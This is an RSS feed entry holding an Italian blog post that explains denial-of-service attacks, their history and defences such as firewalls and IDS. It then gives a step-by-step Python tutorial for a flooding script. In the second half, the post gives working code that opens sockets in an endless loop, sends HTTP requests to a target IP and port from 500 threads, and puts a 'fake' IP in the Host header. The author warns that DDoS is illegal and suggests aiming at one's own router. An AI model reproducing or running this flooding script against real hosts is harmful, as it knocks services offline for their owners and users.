<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Network on HomePage</title>
    <link>https://kobra3390.github.io/SpaceHack/tags/network/</link>
    <description>Recent content in Network on HomePage</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language><atom:link href="https://kobra3390.github.io/SpaceHack/tags/network/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Cos&#39;è un attacco DDoS e come farlo con Python</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</guid>
      <description>Introduzione Wikipedia lo definisce come un attacco informatico che mira ad esaurire le risorse di un sistema informatico, mirando quindi a negare la disponibilità del servizio verso client benevoli. Come vedremo ci sono diverse modalità per esaurire la risorse di un servizio, ad esempio:
Congestione della rete Riempimento della memoria Avvelenamento della traduzione a dominio Riduzione della potenza di computazione Solitamente I DoS sono attacchi temporanei, atti a bloccare le risorse per tempi più o meno brevi, ma ci sono anche casi speciali in cui l’attacco porta ad un danneggiamento o distruzione completa del firmware, solitamente detti PDOs o phlashing.</description>
      <content>&lt;hr&gt;
&lt;br&gt;
&lt;h1 id=&#34;introduzione&#34;&gt;Introduzione&lt;/h1&gt;
&lt;p&gt;Wikipedia lo definisce come un attacco informatico che mira ad esaurire le risorse di un sistema informatico, mirando quindi a negare la disponibilità del servizio verso client benevoli. Come vedremo ci sono diverse modalità per esaurire la risorse di un servizio, ad esempio:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Congestione della rete&lt;/li&gt;
&lt;li&gt;Riempimento della memoria&lt;/li&gt;
&lt;li&gt;Avvelenamento della traduzione a dominio&lt;/li&gt;
&lt;li&gt;Riduzione della potenza di computazione&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Solitamente I DoS sono attacchi temporanei, atti a bloccare le risorse per tempi più o meno brevi, ma ci sono anche casi speciali in cui l’attacco porta ad un danneggiamento o distruzione completa del firmware, solitamente detti PDOs o phlashing. Questi attacchi sono una delle categorie più pericolose per un’azienda o ente che offre servizi via web, in quanto qualunque ‘nemico’ (come aziende concorrenti o governi) con abbastanza risorse potrebbe danneggiare irrimediabilmente la vittima. Chiunque compie questo attacco per divertimento o per “diletto” non ha compreso per nulla le potenzialità e la pericolosità dello stesso.&lt;/p&gt;
&lt;p&gt;Gli attacchi, in base alla modalità possono dividersi in:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Diretti&lt;/strong&gt;: l’attaccante colpisce in maniera diretta la vittima, senza utilizzare host di terze parti;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Indiretti&lt;/strong&gt;: l’attaccante, vuoi per anonimato, vuoi per poca potenza di banda, utilizza sistemi terzi per eseguire l’attacco.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;attacco-smurf&#34;&gt;Attacco Smurf&lt;/h2&gt;
&lt;p&gt;È stato il primo attacco DoS, lanciato verso gli anni ‘90. In esso l’attaccante invia un grande numero di richieste ICMP (Internet Control Message Protocol) ad un indirizzo broadcast. Essendo richieste echo venivano inviate a tutti i nodi partecipanti alla rete i quali rispondevano alla richiesta, inviando anche loro un messaggio, questa volta all’indirizzo IP vittima (lo spoofed IP), il quale veniva inondato letteralmente di pacchetti.&lt;/p&gt;
&lt;h2 id=&#34;ping-of-death&#34;&gt;Ping of death&lt;/h2&gt;
&lt;p&gt;L’attacco, utilizzato alla fine degli anni ‘90, utilizzava una grave vulnerabilità nel protocollo IP dei principali sistemi operativi. L’attaccante inviava un pacchetto IP malformato che causava un buffer overflow alla vittima e il conseguente blocco del servizio.&lt;/p&gt;
&lt;h2 id=&#34;attacco-tcp-syn-flood&#34;&gt;Attacco TCP SYN flood&lt;/h2&gt;
&lt;p&gt;Questo attacco mira a saturare le risorse della macchina, basandosi su una peculiarità del protocollo TCP, il quale, ogni qualvolta viene aperta una connessione TCP esegue un three way handshake. L’attaccante non esegue di fatto il three way ma invia solo il primo pacchetto SYN, lasciando uno stato aperto (una struttura di memoria fondamentalmente) sul server.&lt;/p&gt;
&lt;p&gt;Una volta che sul server sono presenti migliaia di connessioni aperte per metà, la memoria andrà ad esaurirsi e l’attacco sarà andato a buon fine. Per risolvere questo attacco basta utilizzare un SYN Cookie, cioè si crea la struttura dati solo quando l’handshake è completato. In questo modo non possono essere create strutture a metà ma solo complete, quindi ragionevolmente, solamente da parte di host innocui:&lt;/p&gt;
&lt;h2 id=&#34;come-difender&#34;&gt;Come difender?&lt;/h2&gt;
&lt;p&gt;Le difese a questa tipologia di attacchi sono ormai molte (ricordiamoci che parliamo di attacchi da un singolo host, principalmente con IP statico) e ben testate.&lt;/p&gt;
&lt;h3 id=&#34;firewall&#34;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;I firewall sono device di sicurezza che permettono di controllare il traffico tra le due parti di una rete. Tutto il traffico deve passare quindi attraverso il firewall per essere protetto. Ci sono due tipi di firewall:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;packet filter: lavorano a livello OSI 3 e 4 e ispezionano l’header dei pacchetti IP, oltre alla porta TCP e UDP. Vengono specificate delle regole per le quali certi pacchetti possono o non possono passare, in entrambe le direzioni. I pacchetti possono quindi essere bloccati in base all’indirizzo IP di sorgente o destinazione o la porta TPC/UDP di sorgente o destinazione.&lt;/li&gt;
&lt;li&gt;stateful packet filter: analizzano il pacchetto, comprendendo le richieste e le risposte (SYN,SYN-ACK, ACK).&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ids&#34;&gt;IDS&lt;/h3&gt;
&lt;p&gt;Gli IDS consistono in una serie di sensori che rilevano dati, e possono essere posizionati sia sugli hosts che sulla rete. Ci sono due approcci alla rilevazione di intrusione:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;basato sulla conoscenza: cercano pattern di traffico o attività che sembrano maligne sulla base di informazioni come login falliti, pattern di bit che indicano un attacco di buffer overflow, certi tipi di pacchetti TCP SYN che indicano un attacco SYN flood. Vengono anche detti misuse detection IDS.&lt;/li&gt;
&lt;li&gt;basato sul comportamento: rilevano anomalie nel sistema, in base alle statistiche di utilizzo (e.g. se di notte non c’è traffico, se c’è è un male)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Gli IDS sono quindi sensori distribuiti atti a raccogliere dati, analizzare, riportare le informazioni utili e nel caso reagire. Idealmente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;proteggono le comunicazioni;&lt;/li&gt;
&lt;li&gt;proteggono I dati;&lt;/li&gt;
&lt;li&gt;possono essere attaccati e manipolati.
Essi si possono dividere in:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Network Based IDS (NIDS) guardano gli attacchi nel traffico di rete&lt;/strong&gt;: essi utilizzano I pacchetti di rete come sorgente e sono tipicamente degli adattatori i rete in modalità promiscua. Riconoscono gli attacchi sulla base di:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pattern o espressioni;&lt;/li&gt;
&lt;li&gt;frequenza di rilevazione (es port scanning);&lt;/li&gt;
&lt;li&gt;correlazione di eventi poco frequenti.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Host-based IDS (HIDS) guardano gli attacchi negli host&lt;/strong&gt;: tipicamente sono sistemi di monitoraggio eventi e log di sicurezza. Verificare il checksum dei file di sistema e eseguibili. Alcuni prodotti ascoltano l’attività delle porte e avvisano se ci sono accessi.&lt;/p&gt;
&lt;p&gt;I semplici attacchi DoS sono ormai in disuso, in quanto decisamente meno performanti rispetto ad un attacco di negazione del servizio distribuito.&lt;/p&gt;
&lt;p&gt;Ora che abbiamo dato una panoramica generiale comprendiamo cos&amp;rsquo;è un attacco DDoS.&lt;/p&gt;
&lt;h1 id=&#34;cosè-un-attacco-denial-of-service&#34;&gt;Cos&amp;rsquo;è un Attacco Denial of Service&lt;/h1&gt;
&lt;p&gt;Un attacco di tipo Distributed Denial of Service (DDoS) è un&amp;rsquo;arma di sicurezza informatica che mira a interrompere le attività aziendali o estorcere denaro alle organizzazioni prese di mira. Le motivazioni di questi attacchi possono essere legate a ragioni di carattere politico, religioso, competitivo o di profitto finanziario. Un attacco DDoS è tecnicamente la versione distribuita del Denial of Service (DoS), che ha lo scopo di interrompere i servizi di un’azienda. I malintenzionati utilizzano enormi volumi di traffico per sovraccaricare i normali carichi di lavoro, server o interconnessioni di rete per renderli inutilizzabili. Se l’effetto degli attacchi DoS è quello di interrompere un servizio, gli attacchi distribuiti (DDoS) vengono invece eseguiti su scala molto più estesa, con il conseguente arresto di intere infrastrutture e servizi scalabili (servizi Cloud).&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nell&amp;rsquo;agosto 2020, la Borsa neozelandese è stata vittima di un attacco DDoS volumetrico che ha interrotto il servizio per tre giorni consecutivi causando la perdita di milioni di dollari.&lt;/li&gt;
&lt;li&gt;Nel febbraio 2020, un hyperscaler globale ha segnalato un attacco alla propria infrastruttura con 2,3 Tbps di traffico malevolo e 20,6 milioni di richieste al secondo.&lt;/li&gt;
&lt;li&gt;Nei mesi di febbraio e marzo 2018, diverse aziende hanno segnalato un nuovo vettore di attacco basato su una vulnerabilità di memcached che utilizzava tecniche di amplificazione e riflessione. OVHcloud ha osservato e filtrato attacchi con dimensioni fino a 1,3 Tbps.&lt;/li&gt;
&lt;li&gt;Nell&amp;rsquo;ottobre 2016, un attacco informatico di tipo Dyn DDoS ha causato l&amp;rsquo;interruzione dei principali servizi Internet con una serie di attacchi DDoS mirati a sistemi gestiti dal provider DNS Dyn.&lt;/li&gt;
&lt;li&gt;Nel settembre 2016 la botnet Mirai, composta da oltre 600.000 dispositivi IoT compromessi (come le telecamere), è stata utilizzata contro una nota pagina di notizie sulla sicurezza, Krebs on Security. Questo attacco ha colpito la vittima con ben 620 Gbps di traffico durante il suo picco maggiore. Contemporaneamente, OVHcloud ha segnalato un attacco di oltre 1 Tbps.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tipi-di-attacco-ddos&#34;&gt;Tipi di attacco DDoS&lt;/h2&gt;
&lt;h3 id=&#34;attacchi-volumetrici&#34;&gt;Attacchi volumetrici&lt;/h3&gt;
&lt;p&gt;Gli &lt;strong&gt;attacchi DDoS volumetrici&lt;/strong&gt; sono i più diffusi. L&amp;rsquo;intento di un attacco di questo tipo è quello di rendere server, servizi o infrastrutture irraggiungibili, inondando con enormi quantità di richieste. In questo modo, la connessione di rete o le risorse risultano sature: gli utenti legittimi non riescono ad accedere ai servizi e i server non sono più in grado di gestire i flussi di traffico né di rispondere alle richieste. Le macchine compromesse (o altri dispositivi connessi come IoT e videocamere), chiamati botnet, possono essere utilizzati dagli hacker per rendere un attacco più distribuito e quindi efficace. Una delle tecniche più utilizzate dagli hacker è quella di inviare da un indirizzo IP falsificato (IP spoofing) grandi quantità di pacchetti di piccole dimensioni alle botnet, che a loro volta rispondono con pacchetti più grandi direttamente alla vittima (all&amp;rsquo;IP falsificato). I bersagli colpiti da questa quantità imprevista di traffico solitamente non sono in grado di rispondere alle richieste e le loro connessioni Internet sono completamente congestionate dal traffico dannoso che occupa tutta la banda disponibile. Questa tecnica è chiamata attacco di riflessione e amplificazione.&lt;/p&gt;
&lt;h3 id=&#34;attacchi-ai-protocolli&#34;&gt;Attacchi ai protocolli&lt;/h3&gt;
&lt;p&gt;Questi tipi di attacco colpiscono i protocolli utilizzati per la comunicazione di rete e sfruttano le vulnerabilità per rendere indisponibili i server o i servizi della vittima. Questo scenario in alcuni casi può portare al sovraccarico dei dispositivi che collegano questi servizi a Internet. Un esempio di attacco basato sui protocolli è lo Smurf DDoS, un Denial of Service distribuito a livello di rete. Un pacchetto inviato da un hacker a un indirizzo di rete broadcast genera una risposta automatica da parte di ogni host. Utilizzando questo metodo e falsificando l’IP sorgente (spoofing), gli aggressori possono deviare un gran numero di risposte e sommergere una vittima con il traffico. Con la giusta quantità di risposte ICMP, un bersaglio può essere tenuto offline.&lt;/p&gt;
&lt;h3 id=&#34;attacchi-a-livello-di-applicazione-l7&#34;&gt;Attacchi a livello di applicazione (L7)&lt;/h3&gt;
&lt;p&gt;Le applicazioni implementano la logica più avanzata e sono generalmente quelle che utilizzano una quantità maggiore di risorse, le più specifiche e probabilmente le meno testate. Queste caratteristiche le rendono un bersaglio perfetto per un attacco. I metodi di attacco sferrati a questo livello di solito richiedono una minima quantità di risorse e, per la maggior parte, possono passare inosservati ai firewall e ai sistemi di protezione DoS generali. Un esempio è un attacco a un server game (come i server Minecraft) che rende un gioco inaffidabile, con molte intermittenze, giocatori che perdono la connessione o causano anche downtime. Questo rende i server game inutilizzabili, quindi la piattaforma perde il suo rank e l&amp;rsquo;immagine del proprietario ne risulta danneggiata, con la conseguente perdita di giocatori e soldi. Per difendersi al meglio da questi tipi di attacco è necessaria una buona comprensione della logica delle applicazioni e dei suoi utilizzi specifici.&lt;/p&gt;
&lt;h1 id=&#34;come-realizzare-uno-script-per-il-ddos&#34;&gt;Come realizzare uno script per il DDoS&lt;/h1&gt;
&lt;p&gt;L&amp;rsquo;implementazione di uno script DDOS in Python è abbastanza semplice.&lt;/p&gt;
&lt;p&gt;Abbiamo solo bisogno di inviare richieste a un host su una porta specifica più e più volte. Questo può essere fatto con i sockets. Per accelerare il processo e renderlo più efficace, utilizzeremo anche il multi-threading. Quindi, saranno necessarie le seguenti librerie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; threading
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora la prima cosa di cui abbiamo bisogno sono l&amp;rsquo;indirizzo IP del bersaglio, la porta che vogliamo attaccare e il nostro falso indirizzo IP che vogliamo usare. Nota che questo tipo di indirizzo IP &amp;ldquo;falso&amp;rdquo; non nasconde realmente chi sei. Non ti rende anonimo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10.0.0.138&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;182.21.20.32&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come ho già detto, DDOS è illegale. Quindi fai attenzione al bersaglio che scegli qui. In questo caso, ho scelto l&amp;rsquo;indirizzo IP del mio router di casa. Puoi anche scegliere il tuo server di casa, la tua stampante o forse anche il tuo sito web. Se non conosci il tuo indirizzo IP, puoi utilizzare la riga di comando e eseguire il ping del dominio per ottenerlo. Come indirizzo IP falso ho scelto un indirizzo casuale ma ancora valido. Ultimo ma non meno importante, ho deciso di attaccare la porta 80, che è HTTP. Se vuoi chiudere un servizio specifico, devi sapere su quale porta sta operando. La prossima cosa che dobbiamo fare è implementare l&amp;rsquo;effettiva funzione di attacco.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questa funzione di attacco è la funzione che verrà eseguita in ciascuno dei nostri singoli thread. Avvia un ciclo infinito, all&amp;rsquo;interno del quale crea un socket, si connette al target e invia una richiesta HTTP più e più volte. Ovviamente, se stai attaccando un&amp;rsquo;altra porta, dovrai anche cambiare il tipo di richiesta che invii.&lt;/p&gt;
&lt;p&gt;Qui puoi vedere che stiamo inserendo il nostro falso indirizzo IP nella richiesta. La richiesta stessa deve essere codificata in byte, in modo che possa essere inviata al server. Alla fine di ogni iterazione, chiudiamo il nostro socket.&lt;/p&gt;
&lt;p&gt;Ora l&amp;rsquo;ultima cosa che dobbiamo fare è eseguire più thread che eseguono questa funzione contemporaneamente. Se eseguissimo semplicemente la funzione, invierebbe molte richieste più e più volte, ma sarebbe sempre solo una dopo l&amp;rsquo;altra. Utilizzando il multithreading, possiamo inviare molte richieste contemporaneamente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;attack)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo caso, stiamo avviando 500 thread che eseguiranno la nostra funzione. Certo, puoi giocare con il numero. Forse 30 o 50 sono già sufficienti. Quando ora eseguiamo il nostro script, eseguiremo il DDOS sull&amp;rsquo;obiettivo ma non vedremo nulla. Se vuoi vedere alcune informazioni, puoi stampare gli importi delle richieste già inviate.&lt;/p&gt;
&lt;p&gt;Basta notare che questo rallenterà il tuo attacco.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; attack_num
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        attack_num &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(attack_num)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Abbiamo creato una variabile attack_num che tiene traccia di quante richieste sono già state inviate. Ad ogni iterazione, aumentiamo questo numero e lo stampiamo.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
